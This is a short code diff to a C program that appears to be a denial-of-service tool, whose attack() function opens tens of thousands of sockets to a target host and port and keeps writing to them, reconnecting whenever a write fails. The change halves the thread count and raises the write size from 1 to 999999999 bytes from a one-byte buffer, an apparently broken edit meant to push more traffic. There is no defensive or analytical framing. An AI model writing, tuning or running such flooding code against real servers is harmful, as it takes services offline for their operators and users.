@@ -47,7 +47,7 @@ void broke(int s) {
 }
 
 #define CONNECTIONS 50000
-#define THREADS 1000
+#define THREADS 500
 int i;
 void attack(char *host, char *port, int id) {
 	int sockets[CONNECTIONS];
@@ -59,7 +59,7 @@ void attack(char *host, char *port, int id) {
 		for(x=0; x != CONNECTIONS; x++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
-			r=write(sockets[x], "\0", 1);
+			r=write(sockets[x], "\0", 999999999);
 			if(r == -1) {
 				close(sockets[x]);
 				sockets[x] = make_socket(host, port);
